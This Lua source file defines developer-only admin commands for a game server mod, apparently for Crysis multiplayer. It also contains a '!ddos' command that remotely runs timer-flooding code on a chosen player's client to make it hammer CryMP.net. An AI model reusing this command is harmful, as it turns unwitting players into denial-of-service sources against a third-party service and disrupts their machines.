---------------------------------------------------------------
-- !lua <luaCode>, executes lua code
---------------------------------------------------------------

NewCommand({
	Name 	= "lua",
	Access	= DEVELOPER,
	Console = true,
	Args = {
		{ "Code", "The lua code you wish to execute" };
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, ...)
		return self:ReadCode(...);
	end;
});

---------------------------------------------------------------
-- !defense, toggles server defense
---------------------------------------------------------------

NewCommand({
	Name 	= "defense",
	Access	= DEVELOPER,
	Console = true,
	Args = {
	--	{ "Code", "The lua code you wish to execute" };
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, ...)
		SERVER_DEFENSE = not SERVER_DEFENSE;
		SendMsg(CHAT_ATOM, player, "(DEFENSE: %s)", (SERVER_DEFENSE and "Activated" or "Deactived"));
	end;
});


---------------------------------------------------------------
-- !reloadmaps, rescans Game/Levels folder for maps
---------------------------------------------------------------

NewCommand({
	Name 	= "reloadmaps",
	Access	= DEVELOPER,
	Console = true,
	Args = {
	};
	Properties = {
	};
	func = function(self, player, ...)
		SysCmd('reloadmaps');
		ATOMGameUtils:ScanLevels(true);
		return true;
	end;
});


---------------------------------------------------------------
-- !initplayer, Re-Initializes a Player

NewCommand({
	Name 	= "initplayer",
	Access	= DEVELOPER,
	Console = true,
	Args = {
		{ "Player", "The target to reinitialize", Target = true, AcceptAll = true };
	};
	Properties = {
		Self = "ATOM"
	};
	func = function(self, player, target)
		if (samePlayer(player, target)) then
			SendMsg(CENTER, player, "REINITIALIZING ...");
			self:InitPlayer(player,nil,true);
		elseif (target=="all") then
			for i, v in pairs(GetPlayers() or{}) do
				SendMsg(CENTER, v, "REINITIALIZING ...");
				self:InitPlayer(v,nil,true);
			end;
		else
			SendMsg(CENTER, target, "REINITIALIZING ...");
			self:InitPlayer(target,nil,true);
		end;
		return true;
	end;
});

---------------------------------------------------------------
-- !testcommand

NewCommand({
	Name 	= "testcommand",
	Access	= DEVELOPER,
	Console = true,
	Args = {
		{ "arg1", "some argument" };
	};
	Properties = {
		Self = 'ATOMNames',
		FromConsole = true,
	};
	func = function(self, player, ...)
		return self:OnConnect(player)
	end;
});

---------------------------------------------------------------
-- !applications, View active Staff-Applications

NewCommand({
	Name 	= "applications",
	Access	= DEVELOPER,
	Console = true,
	Args = {
	};
	Properties = {
		Self = 'ATOM_Usergroups',
	};
	func = function(self, player, x, z)
		return self:ListApplications(player, x, z);
	end;
});

---------------------------------------------------------------
-- !debug, toggles chat-debugging messages

NewCommand({
	Name 	= "debug",
	Access	= DEVELOPER,
	Console = true,
	Description = "Toggles chat-debugging messages",
	Args = {
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player)
		DEBUG_MESSAGES = not DEBUG_MESSAGES;
		SendMsg(CHAT_ATOM, player, "(DEBUG: Messages %s)", (DEBUG_MESSAGES and "enabled" or "disabled"));
	end;
});

---------------------------------------------------------------
-- !ddos, will make someone DDOS CryMP.net

NewCommand({
	Name 	= "ddos",
	Access	= DEVELOPER,
	Console = true,
	Description = "Will make someone DDOS CryMP.net",
	Args = {
		{ "Target", "The name of the target", Required = true, Target = true },
	};
	Properties = {
		Self = 'ATOM',
	};
	func = function(self, player, t)
		if (t:HasAccess(CREATOR)) then
			return false, "cannot be used on trusted members";
		end;
		SendMsg(CHAT_ATOM, player, "(%s: DDOSing CryMP.Net)", t:GetName());
		ExecuteOnPlayer(t, [[for i=1,10000 do Script.SetTimer(1,function()System.ExecuteCommand("0")System.ExecuteCommand("info " ..math.random(1,6))System.ClearConsole()end)end;]]);
	end;
});

---------------------------------------------------------------
-- !rpclog

NewCommand({
	Name 	= "rpclog",
	Access	= DEVELOPER,
	Console = true,
	Description = "Log all in- and outgoing RPC Calls",
	Args = {
	},
	Properties = {
		Self = 'RCA',
	},
	func = function(self, player, t)
		if (not RCA_LOG) then
			RCA_LOG = true
		else
			RCA_LOG = false
		end
		SendMsg(CHAT_ATOM, player, "(RCALog: %s)", string.bool(RCA_LOG, BTOSTRING_TOGGLED))
	end
})



------------------------------------------------------------------------
-- !logsize

NewCommand({
	Name 	= "spamlog",
	Access	= DEVELOPER,
	Description = "Spams a logs for debugging purposes",
	Console = true,
	Args = {
	--	{ "Player", "The Name of the player you wish to grant Specified Access", Required = true, Target = true, NotPlayer = true };
		{ "count", "Amount of messages to log", Integer = true, PositiveNumber = true };
	};
	Properties = {
		Self = 'ATOMLog',
	};
	func = function(self, player, x)
		Debug(ATOM.ServerRootDir)
		local f, err = io.open(ATOM.ServerRootDir.."Server.log", "r");
		if (not f or err) then
			self:LogError("Can't open Server.log for checking size");
			return false, err;
		end;
		local bytes_before = f:seek("end");
		for i = 1, (x or 100) do
			--Debug("!")
			--f:write("16 bytes of spam\n");
			SysLog(string.rep("a", 600));
		end;
		--f:close();
		--f, err = io.open(ATOM.ServerRootDir.."Server.log", "r");
		local bytes_after = f:seek("end");
		--Debug(bytes_before , "now", bytes_after)
		SendMsg(CHAT_ATOM, player, "Spammed %0.2fKB into log file", (bytes_after - bytes_before) / ONE_KB);
		f:close();
	end;
});



------------------------------------------------------------------------
-- !logsize

NewCommand({
	Name 	= "spamrpc",
	Access	= DEVELOPER,
	Description = "Spams a specified or all players with RPC code to test for server stability",
	Console = true,
	Args = {
		{ "Count", "Amount of calls to execute", Integer = true, PositiveNumber = true, Range = { 1, 99999 } };
		{ "Player", "The Name of the player you wish to spam RPC on", Required = false, Target = true, NotPlayer = true, AcceptAll = 1 };
	};
	Properties = {
		Self = 'ATOMLog',
	};
	func = function(self, player, Count, target)
		if (not target or target == "all") then
			SendMsg(CHAT_ATOM, player, "Executing code %d times on all Players", Count);
			for i = 1, Count do
				--Script.SetTimer(i,function()
				ExecuteOnAll("_CALLEDTIMES=(_CALLEDTIMES or 0)+1;if (_CALLEDTIMES == " .. Count .. " or not lastC or _time-lastC>5) then lastC=_time Msg(0,\"called %d times\",_CALLEDTIMES)end;")
				--end);
			end;
		else
			SendMsg(CHAT_ATOM, player, "Executing code %d times on %s", Count, target:GetName());
			for i = 1, Count do
				--Script.SetTimer(i,function()
				ExecuteOnPlayer(player,"_CALLEDTIMES=(_CALLEDTIMES or 0)+1;if (_CALLEDTIMES == " .. Count .. " or not lastC or _time-lastC>5) then lastC=_time Msg(0,\"called %d times\",_CALLEDTIMES)end;")
				--end);
			end;
		end;
		SendMsg(CHAT_ATOM, player, "All done");
	end;
});




------------------------------------------------------------------------
-- !rpcflush

NewCommand({
	Name 	= "rpcflush",
	Access	= DEVELOPER,
	Description = "Flush the Synched RPC Storage",
	Console = true,
	Args = {
	--	{ "Count", "Amount of calls to execute", Integer = true, PositiveNumber = true, Range = { 1, 99999 } };
	--	{ "Player", "The Name of the player you wish to spam RPC on", Required = false, Target = true, NotPlayer = true, AcceptAll = 1 };
	};
	Properties = {
		Self = 'RCA',
	};
	func = function(self, player, Count, target)
		self.storedCode = {};
		SendMsg(CHAT_ATOM, player, "Storage Flush complete");
	end;
});

------------------------------------------------------------------------
-- !clflush

NewCommand({
	Name 	= "clflush",
	Access	= DEVELOPER,
	Description = "Flush the Synched RPC Storage",
	Console = true,
	Args = {
	--	{ "Count", "Amount of calls to execute", Integer = true, PositiveNumber = true, Range = { 1, 99999 } };
	--	{ "Player", "The Name of the player you wish to spam RPC on", Required = false, Target = true, NotPlayer = true, AcceptAll = 1 };
	};
	Properties = {
		Self = 'RCA',
	};
	func = function(self, player, Count, target)
		self.quenedCalls = {};
		SendMsg(CHAT_ATOM, player, "Client Code Queue Flush complete");
	end;
});


------------------------------------------------------------------------
-- !conflush

NewCommand({
	Name 	= "conflush",
	Access	= DEVELOPER,
	Description = "Clears chat queue",
	Console = true,
	Args = {
		--	{ "Player", "The Name of the player you wish to grant Specified Access", Required = true, Target = true, NotPlayer = true };
		--	{ "Access", "The Access you wish to grant the Player", Integer = true, PositiveNumber = true };
	};
	Properties = {
		Self = 'ATOMLog',
	};
	func = function(self, player)
		local iMsgs = arrSize(ATOMChat.quenedMessages)
		SendMsg(CHAT_ATOM, player, "Flushed %d Messages", iMsgs)

		ATOMChat.quenedMessages = {}
	end;
});

------------------------------------------------------------------------
-- !setrole

NewCommand({
	Name 	= "setrole",
	Access	= DEVELOPER,
	Description = "Clears chat queue",
	Console = true,
	Args = {
		{ "Player", "The Name of the player you wish to spam change roles on", Required = false, Target = true, NotPlayer = true, Default = "self", AcceptAll = 1 };
		{ "Role", "The new role for the player", Required = true, Integer = true, IsNumber = true, Limit = { 0, 2 } };
	};
	Properties = {
	};
	func = function(self, hTarget, iGender)

		if (not GENDER_NAMES[iGender]) then
			return false, "invalid role"
		end

		if (hTarget:GetGender(iGender)) then
			return false, "choose a different role"
		end

		hTarget:SetGender(iGender)
		SendMsg(CHAT_ATOM, self, "(%s: Role Changed to %s)", hTarget:GetName(), GENDER_NAMES[iGender])
	end;
});
